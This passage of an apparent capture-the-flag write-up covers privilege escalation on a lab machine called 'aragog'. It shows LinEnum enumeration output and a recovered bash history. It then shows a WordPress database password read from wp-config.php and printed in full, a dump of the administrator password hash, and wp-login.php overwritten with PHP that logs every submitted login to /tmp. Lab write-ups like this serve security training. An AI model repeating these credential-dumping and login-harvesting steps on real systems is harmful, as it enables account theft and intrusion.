-rw-r--r-- 1 root root  405 Oct 27  2017 timers.target
-rw-r--r-- 1 root root  395 Oct 27  2017 time-sync.target
-rw-r--r-- 1 root root  417 Oct 27  2017 umount.target
-rw-r--r-- 1 root root  392 Oct 27  2017 user.slice
-rw-r--r-- 1 root root  342 Oct 27  2017 getty-static.service
-rw-r--r-- 1 root root  153 Oct 27  2017 sigpwr-container-shutdown.service
-rw-r--r-- 1 root root  175 Oct 27  2017 systemd-networkd-resolvconf-update.path
-rw-r--r-- 1 root root  715 Oct 27  2017 systemd-networkd-resolvconf-update.service
-rw-r--r-- 1 root root  420 Oct 23  2017 resolvconf.service
-rw-r--r-- 1 root root  266 Oct 16  2017 wpa_supplicant.service
lrwxrwxrwx 1 root root   27 Sep 13  2017 plymouth-log.service -> plymouth-read-write.service
lrwxrwxrwx 1 root root   21 Sep 13  2017 plymouth.service -> plymouth-quit.service
-rw-r--r-- 1 root root  412 Sep 13  2017 plymouth-halt.service
-rw-r--r-- 1 root root  426 Sep 13  2017 plymouth-kexec.service
-rw-r--r-- 1 root root  421 Sep 13  2017 plymouth-poweroff.service
-rw-r--r-- 1 root root  194 Sep 13  2017 plymouth-quit.service
-rw-r--r-- 1 root root  200 Sep 13  2017 plymouth-quit-wait.service
-rw-r--r-- 1 root root  244 Sep 13  2017 plymouth-read-write.service
-rw-r--r-- 1 root root  416 Sep 13  2017 plymouth-reboot.service
-rw-r--r-- 1 root root  532 Sep 13  2017 plymouth-start.service
-rw-r--r-- 1 root root  291 Sep 13  2017 plymouth-switch-root.service
-rw-r--r-- 1 root root  490 Sep 13  2017 systemd-ask-password-plymouth.path
-rw-r--r-- 1 root root  467 Sep 13  2017 systemd-ask-password-plymouth.service
-rw-r--r-- 1 root root  384 Sep 11  2017 bluetooth.service
-rw-r--r-- 1 root root  142 Aug 22  2017 cups.path
-rw-r--r-- 1 root root  175 Aug 22  2017 cups.service
-rw-r--r-- 1 root root  116 Aug 22  2017 cups.socket
drwxr-xr-x 2 root root 4.0K Aug  1  2017 display-manager.service.d
drwxr-xr-x 2 root root 4.0K Aug  1  2017 system-update.target.wants
drwxr-xr-x 2 root root 4.0K Aug  1  2017 basic.target.wants
drwxr-xr-x 2 root root 4.0K Aug  1  2017 busnames.target.wants
-rw-r--r-- 1 root root  253 Jul 27  2017 whoopsie.service
-rw-r--r-- 1 root root  117 Jul 10  2017 fwupdate-cleanup.service
-rw-r--r-- 1 root root  167 Jul  6  2017 wacom-inputattach@.service
-rw-r--r-- 1 root root  169 Jun 19  2017 apt-daily.service
-rw-r--r-- 1 root root  212 Jun 19  2017 apt-daily.timer
-rw-r--r-- 1 root root  202 Jun 19  2017 apt-daily-upgrade.service
-rw-r--r-- 1 root root  184 Jun 19  2017 apt-daily-upgrade.timer
-rw-r--r-- 1 root root  189 Jun 14  2017 uuidd.service
-rw-r--r-- 1 root root  126 Jun 14  2017 uuidd.socket
-rw-r--r-- 1 root root  345 Apr 20  2017 unattended-upgrades.service
-rw-r--r-- 1 root root  254 Apr 18  2017 thermald.service
-rw-r--r-- 1 root root  506 Mar 31  2017 lightdm.service
-rw-r--r-- 1 root root  385 Mar 16  2017 ssh.service
-rw-r--r-- 1 root root  196 Mar 16  2017 ssh@.service
-rw-r--r-- 1 root root  216 Mar 16  2017 ssh.socket
-rw-r--r-- 1 root root  239 Mar 10  2017 gpu-manager.service
-rw-r--r-- 1 root root  460 Feb  9  2017 run-vmblock-fuse.mount
-rw-r--r-- 1 root root  411 Feb  3  2017 mysql.service
-rw-r--r-- 1 root root  269 Jan 31  2017 setvtrgb.service
-rw-r--r-- 1 root root  491 Jan 12  2017 dbus.service
-rw-r--r-- 1 root root  106 Jan 12  2017 dbus.socket
-rw-r--r-- 1 root root  735 Nov 30  2016 networking.service
-rw-r--r-- 1 root root  497 Nov 30  2016 ifup@.service
-rw-r--r-- 1 root root  631 Nov  3  2016 accounts-daemon.service
-rw-r--r-- 1 root root  251 Sep 17  2016 open-vm-tools.service
-rw-r--r-- 1 root root  234 Aug 22  2016 cups-browsed.service
-rw-r--r-- 1 root root  134 Aug 19  2016 failsafe-graphical.target
-rw-r--r-- 1 root root  232 Aug 19  2016 failsafe-x.service
-rw-r--r-- 1 root root  138 Aug 17  2016 fwupd-offline-update.service
-rw-r--r-- 1 root root  259 Aug 17  2016 fwupd.service
-rw-r--r-- 1 root root  285 Jun 16  2016 keyboard-setup.service
-rw-r--r-- 1 root root  288 Jun 16  2016 console-setup.service
-rw-r--r-- 1 root root  451 Jun 15  2016 upower.service
-rw-r--r-- 1 root root  545 Apr 27  2016 brltty.service
-rw-r--r-- 1 root root  429 Apr 27  2016 brltty-udev.service
-rw-r--r-- 1 root root  510 Apr 14  2016 alsa-restore.service
-rw-r--r-- 1 root root  483 Apr 14  2016 alsa-state.service
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel1.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel2.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel3.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel4.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel5.target.wants
-rw-r--r-- 1 root root  234 Apr  8  2016 acpid.service
-rw-r--r-- 1 root root  251 Apr  5  2016 cron.service
-rw-r--r-- 1 root root  290 Apr  5  2016 rsyslog.service
-rw-r--r-- 1 root root  196 Apr  1  2016 udisks2.service
-rw-r--r-- 1 root root  142 Mar 31  2016 apport-forward@.service
-rw-r--r-- 1 root root  376 Mar 10  2016 kerneloops.service
-rw-r--r-- 1 root root  571 Mar  7  2016 udev-configure-printer@.service
-rw-r--r-- 1 root root  248 Feb 10  2016 vsftpd.service
-rw-r--r-- 1 root root  115 Feb  9  2016 acpid.socket
-rw-r--r-- 1 root root  115 Feb  9  2016 acpid.path
-rw-r--r-- 1 root root  207 Jan 27  2016 pppd-dns.service
-rw-r--r-- 1 root root  182 Jan 13  2016 polkitd.service
-rw-r--r-- 1 root root  183 Jan  4  2016 usbmuxd.service
-rw-r--r-- 1 root root 1.1K Nov 24  2015 avahi-daemon.service
-rw-r--r-- 1 root root  874 Nov 24  2015 avahi-daemon.socket
-rw-r--r-- 1 root root  298 Nov  6  2015 colord.service
-rw-r--r-- 1 root root  268 Nov  4  2015 ModemManager.service
-rw-r--r-- 1 root root 1.1K Oct 25  2015 rtkit-daemon.service
-rw-r--r-- 1 root root  428 Oct 23  2015 dns-clean.service
-rw-r--r-- 1 root root  178 Oct  5  2015 usb_modeswitch@.service
-rw-r--r-- 1 root root  790 Jun  1  2015 friendly-recovery.service
-rw-r--r-- 1 root root  309 Apr 25  2015 saned@.service
-rw-r--r-- 1 root root  241 Mar  2  2015 ufw.service
-rw-r--r-- 1 root root  250 Feb 24  2015 ureadahead-stop.service
-rw-r--r-- 1 root root  242 Feb 24  2015 ureadahead-stop.timer
-rw-r--r-- 1 root root  401 Feb 24  2015 ureadahead.service
-rw-r--r-- 1 root root  283 Dec 28  2014 anacron-resume.service
-rw-r--r-- 1 root root  183 Dec 28  2014 anacron.service
-rw-r--r-- 1 root root  132 Dec 11  2014 saned.socket
-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service

/lib/systemd/system/halt.target.wants:
total 0
lrwxrwxrwx 1 root root 24 Sep 13  2017 plymouth-halt.service -> ../plymouth-halt.service

/lib/systemd/system/initrd-switch-root.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Sep 13  2017 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 31 Sep 13  2017 plymouth-switch-root.service -> ../plymouth-switch-root.service

/lib/systemd/system/kexec.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Sep 13  2017 plymouth-kexec.service -> ../plymouth-kexec.service

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Dec 18  2017 dbus.service -> ../dbus.service
lrwxrwxrwx 1 root root 15 Oct 27  2017 getty.target -> ../getty.target
lrwxrwxrwx 1 root root 33 Oct 27  2017 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 25 Oct 27  2017 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 39 Oct 27  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 Oct 27  2017 systemd-user-sessions.service -> ../systemd-user-sessions.service
lrwxrwxrwx 1 root root 24 Sep 13  2017 plymouth-quit.service -> ../plymouth-quit.service
lrwxrwxrwx 1 root root 29 Sep 13  2017 plymouth-quit-wait.service -> ../plymouth-quit-wait.service

/lib/systemd/system/poweroff.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Oct 27  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 28 Sep 13  2017 plymouth-poweroff.service -> ../plymouth-poweroff.service

/lib/systemd/system/reboot.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Oct 27  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 26 Sep 13  2017 plymouth-reboot.service -> ../plymouth-reboot.service

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 24 Dec 18  2017 console-setup.service -> ../console-setup.service
lrwxrwxrwx 1 root root 25 Dec 18  2017 keyboard-setup.service -> ../keyboard-setup.service
lrwxrwxrwx 1 root root 19 Dec 18  2017 setvtrgb.service -> ../setvtrgb.service
lrwxrwxrwx 1 root root 30 Oct 27  2017 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
lrwxrwxrwx 1 root root 24 Oct 27  2017 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 31 Oct 27  2017 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 20 Oct 27  2017 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 Oct 27  2017 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 Oct 27  2017 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 28 Oct 27  2017 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 36 Oct 27  2017 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 32 Oct 27  2017 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 Oct 27  2017 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 Oct 27  2017 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 36 Oct 27  2017 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 Oct 27  2017 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 27 Oct 27  2017 systemd-journald.service -> ../systemd-journald.service
lrwxrwxrwx 1 root root 32 Oct 27  2017 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 36 Oct 27  2017 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
lrwxrwxrwx 1 root root 31 Oct 27  2017 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 Oct 27  2017 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 Oct 27  2017 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 37 Oct 27  2017 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 Oct 27  2017 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 30 Oct 27  2017 systemd-update-utmp.service -> ../systemd-update-utmp.service
lrwxrwxrwx 1 root root 30 Sep 13  2017 plymouth-read-write.service -> ../plymouth-read-write.service
lrwxrwxrwx 1 root root 25 Sep 13  2017 plymouth-start.service -> ../plymouth-start.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 14 Dec 18  2017 dbus.socket -> ../dbus.socket
lrwxrwxrwx 1 root root 31 Oct 27  2017 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Oct 27  2017 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
lrwxrwxrwx 1 root root 25 Oct 27  2017 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 32 Oct 27  2017 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
lrwxrwxrwx 1 root root 34 Oct 27  2017 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 Oct 27  2017 systemd-journald.socket -> ../systemd-journald.socket

/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Oct 27  2017 getty-static.service -> ../getty-static.service

/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Oct 27  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/local-fs.target.wants:
total 0
lrwxrwxrwx 1 root root 29 Oct 27  2017 systemd-remount-fs.service -> ../systemd-remount-fs.service

/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Oct 27  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/resolvconf.service.wants:
total 0
lrwxrwxrwx 1 root root 42 Oct 27  2017 systemd-networkd-resolvconf-update.path -> ../systemd-networkd-resolvconf-update.path

/lib/systemd/system/sigpwr.target.wants:
total 0
lrwxrwxrwx 1 root root 36 Oct 27  2017 sigpwr-container-shutdown.service -> ../sigpwr-container-shutdown.service

/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Oct 27  2017 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer

/lib/systemd/system/rc-local.service.d:
total 4.0K
-rw-r--r-- 1 root root 290 Oct 26  2017 debian.conf

/lib/systemd/system/systemd-resolved.service.d:
total 4.0K
-rw-r--r-- 1 root root 200 Oct 27  2017 resolvconf.conf

/lib/systemd/system/systemd-timesyncd.service.d:
total 4.0K
-rw-r--r-- 1 root root 251 Oct 26  2017 disable-with-time-daemon.conf

/lib/systemd/system/apache2.service.d:
total 4.0K
-rw-r--r-- 1 root root 42 Apr 12  2016 apache2-systemd.conf

/lib/systemd/system/display-manager.service.d:
total 4.0K
-rw-r--r-- 1 root root 110 Aug 19  2016 xdiagnose.conf

/lib/systemd/system/system-update.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Dec 18  2017 fwupd-offline-update.service -> ../fwupd-offline-update.service

/lib/systemd/system/basic.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Dec 18  2017 alsa-restore.service -> ../alsa-restore.service
lrwxrwxrwx 1 root root 21 Dec 18  2017 alsa-state.service -> ../alsa-state.service

/lib/systemd/system/busnames.target.wants:
total 0

/lib/systemd/system/runlevel1.target.wants:
total 0

/lib/systemd/system/runlevel2.target.wants:
total 0

/lib/systemd/system/runlevel3.target.wants:
total 0

/lib/systemd/system/runlevel4.target.wants:
total 0

/lib/systemd/system/runlevel5.target.wants:
total 0

/lib/systemd/network:
total 12K
-rw-r--r-- 1 root root 404 Oct 27  2017 80-container-host0.network
-rw-r--r-- 1 root root 482 Oct 27  2017 80-container-ve.network
-rw-r--r-- 1 root root  80 Oct 27  2017 99-default.link

/lib/systemd/system-generators:
total 668K
-rwxr-xr-x 1 root root  71K Oct 27  2017 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root  59K Oct 27  2017 systemd-dbus1-generator
-rwxr-xr-x 1 root root  43K Oct 27  2017 systemd-debug-generator
-rwxr-xr-x 1 root root  79K Oct 27  2017 systemd-fstab-generator
-rwxr-xr-x 1 root root  39K Oct 27  2017 systemd-getty-generator
-rwxr-xr-x 1 root root 119K Oct 27  2017 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root  39K Oct 27  2017 systemd-hibernate-resume-generator
-rwxr-xr-x 1 root root  39K Oct 27  2017 systemd-insserv-generator
-rwxr-xr-x 1 root root  35K Oct 27  2017 systemd-rc-local-generator
-rwxr-xr-x 1 root root  31K Oct 27  2017 systemd-system-update-generator
-rwxr-xr-x 1 root root 103K Oct 27  2017 systemd-sysv-generator

/lib/systemd/system-preset:
total 4.0K
-rw-r--r-- 1 root root 869 Oct 27  2017 90-systemd.preset

/lib/systemd/system-sleep:
total 8.0K
-rwxr-xr-x 1 root root  92 Mar 17  2016 hdparm
-rwxr-xr-x 1 root root 182 Oct 26  2015 wpasupplicant

/lib/systemd/system-shutdown:
total 0


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.16


[-] MYSQL version:
mysql  Ver 14.14 Distrib 5.7.20, for Linux (x86_64) using  EditLine wrapper


[-] Apache version:
Server version: Apache/2.4.18 (Ubuntu)
Server built:   2017-09-18T15:09:02


[-] Apache user configuration:
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


[-] Installed Apache modules:
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_prefork_module (shared)
 negotiation_module (shared)
 php7_module (shared)
 setenvif_module (shared)
 status_module (shared)


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc


[-] Installed compilers:
ii  g++                                        4:5.3.1-1ubuntu1                             amd64        GNU C++ compiler
ii  g++-5                                      5.4.0-6ubuntu1~16.04.5                       amd64        GNU C++ compiler
ii  gcc                                        4:5.3.1-1ubuntu1                             amd64        GNU C compiler
ii  gcc-5                                      5.4.0-6ubuntu1~16.04.5                       amd64        GNU C compiler
ii  hardening-includes                         2.7ubuntu2                                   all          Makefile for enabling compiler flags for security hardening
ii  libllvm3.8:amd64                           1:3.8-2ubuntu4                               amd64        Modular compiler and toolchain technologies, runtime library
ii  libllvm4.0:amd64                           1:4.0-1ubuntu1~16.04.2                       amd64        Modular compiler and toolchain technologies, runtime library
ii  libllvm5.0:amd64                           1:5.0-3~16.04.1                              amd64        Modular compiler and toolchain technologies, runtime library
ii  libxkbcommon0:amd64                        0.5.0-1ubuntu2                               amd64        library interface to the XKB compiler - shared library


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 2441 Dec 23  2017 /etc/passwd
-rw-r--r-- 1 root root 987 Dec 21  2017 /etc/group
-rw-r--r-- 1 root root 575 Oct 22  2015 /etc/profile
-rw-r----- 1 root shadow 1547 Dec 21  2017 /etc/shadow


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 280 Jun 19  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 112 Jan 10  2014 /etc/apg.conf
-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
-rw-r--r-- 1 root root 7649 Aug  1  2017 /etc/pnm2ppa.conf
-rw-rw-r-- 1 root root 350 Dec 18  2017 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 967 Oct 30  2015 /etc/mke2fs.conf
-rw-r--r-- 1 root root 624 Aug  8  2007 /etc/mtools.conf
-rw-r--r-- 1 root root 8464 Dec 19  2017 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 529 Aug  1  2017 /etc/nsswitch.conf
-rw-r--r-- 1 root root 191 Jan 18  2016 /etc/libaudit.conf
-rw-r--r-- 1 root root 2084 Sep  5  2015 /etc/sysctl.conf
-rw-r--r-- 1 root root 1803 Nov  6  2015 /etc/signond.conf
-rw-r--r-- 1 root root 27 Jan  7  2015 /etc/libao.conf
-rw-r--r-- 1 root root 2584 Feb 18  2016 /etc/gai.conf
-rw-r--r-- 1 root root 4781 Mar 17  2016 /etc/hdparm.conf
-rw-r--r-- 1 root root 771 Mar  6  2015 /etc/insserv.conf
-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
-rw-r--r-- 1 root root 14867 Apr 11  2016 /etc/ltrace.conf
-rw-r--r-- 1 root root 110 Dec 18  2017 /etc/kernel-img.conf
-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf
-rw-r--r-- 1 root root 23444 Apr 28  2016 /etc/brltty.conf
-rw-r--r-- 1 root root 1308 Mar 10  2016 /etc/kerneloops.conf
-rw-r--r-- 1 root root 3028 Aug  1  2017 /etc/adduser.conf
-rw-r--r-- 1 root root 703 May  5  2015 /etc/logrotate.conf
-rw-r--r-- 1 root root 10368 Oct  2  2015 /etc/sensors3.conf
-rw-r--r-- 1 root root 2969 Nov 10  2015 /etc/debconf.conf
-rw-r--r-- 1 root root 1018 Oct  5  2015 /etc/usb_modeswitch.conf
-rw-r--r-- 1 root root 92 Oct 22  2015 /etc/host.conf
-rw-r--r-- 1 root root 331 Aug 17  2016 /etc/fwupd.conf
-rw-r--r-- 1 root root 389 Apr 18  2016 /etc/appstream.conf
-rw-r--r-- 1 root root 338 Nov 17  2014 /etc/updatedb.conf
-rw-r--r-- 1 root root 6150 Dec 21  2017 /etc/vsftpd.conf
-rw-r--r-- 1 root root 1371 Jan 27  2016 /etc/rsyslog.conf


[-] Current user's history files:
-rw-rw-r-- 1 florian florian 1085 Sep  3 06:00 /home/florian/.bash_history
-rw------- 1 florian florian 1621 Sep  3 05:40 /home/florian/.mysql_history


[-] Location and contents (if accessible) of .bash_history file(s):
/home/florian/.bash_history

groups
cat /etc/passwd
su root
sudo -l
cat /etc/groups
cat /etc/group
grep "lxd" /etc/group
grep "cliff" /etc/group
grep "lxd" /etc/group
init 0
su root
id
echo $PATH
pwd
ls -lisa bin
ls
ls -lisa
echo $PATH
sudo -l
mkdir bin
ls -lisa | grep bin
ls
ls -lisa Downloads/
./LinEnum.sh
cd bin/
./LinEnum.sh
clear
./LinEnum.sh -t
su root
which rsync
ps -elf | grep rsync
nestat -an | grep rsync
netstat -an | grep rsync
ssh -V
cat /etc/ssh
ls /etc/ssh
ls -lisa /etc/ssh
cat /etc/ssh/ssh_config | grep UsePrivilegeSeparation
cat /etc/ssh/sshd_config | grep UsePrivilegeSeparation
cd
ls -lisa
ls -lisa .ssh/
cd /var/www/html/dev_wiki/
ls
ls -lisa
cd wp-admin/
ls -lisa
cd user
ls -lisa
cat admin.php
cd ../../wp-config
cd ../../../wp-config
cd ../../../
cd dev_wiki/
ls
cat wp-config.php
ls
ls -lisa
cd ..
ls
cd dev_wiki/
ls
cat wp-config.php
cat wp-config.php | egrep password
cat wp-config.php | egrep PASSWORD
mysql
mysql -u root -p
cd ..
ls
cd dev_wiki/
ls
vi wp-login.php
ls
cd ../../; cd html/dev_wiki
ls
vi wp-login.php
ls -lisa | grep .
ls
ls -lisa
cat .Su
su -
su - root
exit


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Aug  1  2017 .
drwxr-xr-x 16 root root 4096 Dec 21  2017 ..


### SCAN COMPLETE ####################################
florian@aragog:~$
```

```sh
root@kali:~/aragog# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
10.10.10.78 	aragog

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
root@kali:~/aragog#
```

```
http://aragog/dev_wiki/
http://aragog/dev_wiki/index.php/blog/
```

![](images/21.png)

![](images/20.png)

```sh
florian@aragog:~$ cd /var/www/html/
florian@aragog:/var/www/html$ ls
dev_wiki  hosts.php  index.html  zz_backup
florian@aragog:/var/www/html$ cd dev_wiki/
florian@aragog:/var/www/html/dev_wiki$ ls
index.php    readme.html      wp-admin            wp-comments-post.php  wp-content   wp-includes        wp-load.php   wp-mail.php      wp-signup.php     xmlrpc.php
license.txt  wp-activate.php  wp-blog-header.php  wp-config.php         wp-cron.php  wp-links-opml.php  wp-login.php  wp-settings.php  wp-trackback.php
florian@aragog:/var/www/html/dev_wiki$
```

```
florian@aragog:/var/www/html/dev_wiki$ vi wp-config.php
```

![](images/22.png)

```
DB_PASSWORD
$@y6CHJ^$#5c37j$#6h
```

```sh
florian@aragog:/var/www/html/dev_wiki$ mysql -u root -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 793
Server version: 5.7.20-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wp_wiki            |
+--------------------+
5 rows in set (0.00 sec)

mysql> use wp_wiki;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wp_wiki     |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> describe wp_users;
+---------------------+---------------------+------+-----+---------------------+----------------+
| Field               | Type                | Null | Key | Default             | Extra          |
+---------------------+---------------------+------+-----+---------------------+----------------+
| ID                  | bigint(20) unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar(60)         | NO   | MUL |                     |                |
| user_pass           | varchar(255)        | NO   |     |                     |                |
| user_nicename       | varchar(50)         | NO   | MUL |                     |                |
| user_email          | varchar(100)        | NO   | MUL |                     |                |
| user_url            | varchar(100)        | NO   |     |                     |                |
| user_registered     | datetime            | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar(255)        | NO   |     |                     |                |
| user_status         | int(11)             | NO   |     | 0                   |                |
| display_name        | varchar(250)        | NO   |     |                     |                |
+---------------------+---------------------+------+-----+---------------------+----------------+
10 rows in set (0.00 sec)

mysql> select user_login,user_pass from wp_users;
+---------------+------------------------------------+
| user_login    | user_pass                          |
+---------------+------------------------------------+
| Administrator | $P$B3FUuIdSDW0IaIc4vsjj.NzJDkiscu. |
+---------------+------------------------------------+
1 row in set (0.00 sec)

mysql> quit
Bye
florian@aragog:/var/www/html/dev_wiki$
```

```sh
florian@aragog:/var/www/html/dev_wiki$ ls -lah
total 200K
drwxrwxrwx  5 cliff    cliff    4.0K Sep  3 09:15 .
drwxrwxrwx  4 www-data www-data 4.0K Sep  3 09:15 ..
-rwxrwxrwx  1 cliff    cliff     253 Sep  3 09:15 .htaccess
-rwxrwxrwx  1 cliff    cliff     418 Sep  3 09:15 index.php
-rwxrwxrwx  1 cliff    cliff     20K Sep  3 09:15 license.txt
-rwxrwxrwx  1 cliff    cliff    7.3K Sep  3 09:15 readme.html
-rwxrwxrwx  1 cliff    cliff    5.4K Sep  3 09:15 wp-activate.php
drwxrwxrwx  9 cliff    cliff    4.0K Sep  3 09:15 wp-admin
-rwxrwxrwx  1 cliff    cliff     364 Sep  3 09:15 wp-blog-header.php
-rwxrwxrwx  1 cliff    cliff    1.6K Sep  3 09:15 wp-comments-post.php
-rwxrwxrwx  1 cliff    cliff    2.8K Sep  3 09:15 wp-config.php
drwxrwxrwx  6 cliff    cliff    4.0K Sep  3 09:15 wp-content
-rwxrwxrwx  1 cliff    cliff    3.6K Sep  3 09:15 wp-cron.php
drwxrwxrwx 18 cliff    cliff     12K Sep  3 09:15 wp-includes
-rwxrwxrwx  1 cliff    cliff    2.4K Sep  3 09:15 wp-links-opml.php
-rwxrwxrwx  1 cliff    cliff    3.3K Sep  3 09:15 wp-load.php
-rwxrwxrwx  1 cliff    cliff     36K Sep  3 09:15 wp-login.php
-rwxrwxrwx  1 cliff    cliff    7.9K Sep  3 09:15 wp-mail.php
-rwxrwxrwx  1 cliff    cliff     16K Sep  3 09:15 wp-settings.php
-rwxrwxrwx  1 cliff    cliff     30K Sep  3 09:15 wp-signup.php
-rwxrwxrwx  1 cliff    cliff    4.6K Sep  3 09:15 wp-trackback.php
-rwxrwxrwx  1 cliff    cliff    3.0K Sep  3 09:15 xmlrpc.php
florian@aragog:/var/www/html/dev_wiki$ 
```

```sh
florian@aragog:/var/www/html/dev_wiki$ echo "" > wp-login.php
florian@aragog:/var/www/html/dev_wiki$ nano wp-login.php
```

```php
<?php
$req_dump = print_r($_REQUEST, TRUE);
$fp = fopen('/tmp/request.log', 'a');
fwrite($fp, $req_dump);
fclose($fp);
?>
```

![](images/23.png)

```sh
florian@aragog:/var/www/html/dev_wiki$ ls /tmp
request.log                                                             systemd-private-6f815f27dd9747ce808ec186c30db8ce-rtkit-daemon.service-A6jcOb       VMwareDnD
